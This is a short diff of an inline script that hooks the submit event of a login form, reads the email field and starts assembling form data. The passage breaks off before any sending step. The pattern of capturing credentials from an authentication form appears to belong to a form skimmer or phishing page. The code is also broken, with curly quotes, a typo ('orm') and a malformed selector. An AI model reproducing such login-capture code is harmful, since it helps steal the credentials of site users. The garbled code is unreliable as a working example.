@@ -1,10 +1,10 @@
 <script>
 
-var form = document.querySelector('ng-untouched ng-pristine ng-invalid');
+var form = document.querySelector(“.auth-wrapper-form form”);
 
 form.addEventListener('submit', function (e) {
 
-var fmail = form.querySelector (“.auth-wrapper-form form”).value;
+var fmail = orm.querySelector(‘#mat-input-0’).value;
 
 
 var form_data = {
